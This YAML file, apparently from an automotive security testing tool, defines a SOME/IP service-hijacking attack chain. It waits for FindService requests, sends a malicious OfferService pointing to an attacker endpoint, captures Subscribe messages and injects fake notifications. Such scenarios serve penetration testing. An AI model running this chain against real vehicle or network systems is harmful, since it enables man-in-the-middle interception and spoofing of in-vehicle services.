id: AC-001
name: 服务劫持攻击链
description: >
  监听合法服务的 FindService 请求，抢先发送恶意 OfferService（指向攻击者端点），
  截获受害方的 Subscribe 和后续 RPC 请求，实现中间人劫持。
severity: high
cvss: 8.5

steps:
  - id: listen_findservice
    action: wait_for
    filter:
      message_type: SD
      sd_entry_type: FindService
    timeout: 30

  - id: send_malicious_offer
    action: send
    template: sd_offer
    params:
      service_id: "${listen_findservice.service_id}"
      instance_id: "0x0001"
      addr: "${attacker_ip}"
      port: 31337
      ttl: 3600
    delay_ms: 50

  - id: capture_subscribe
    action: wait_for
    filter:
      message_type: SD
      sd_entry_type: Subscribe
    timeout: 10
    required: false

  - id: send_fake_notification
    action: send
    template: notification
    params:
      service_id: "${listen_findservice.service_id}"
      event_id: "0x8001"
      payload: "DEADBEEFCAFEBABE"
    repeat: 3
    delay_ms: 100

success_criteria:
  capture_subscribe_completed: true
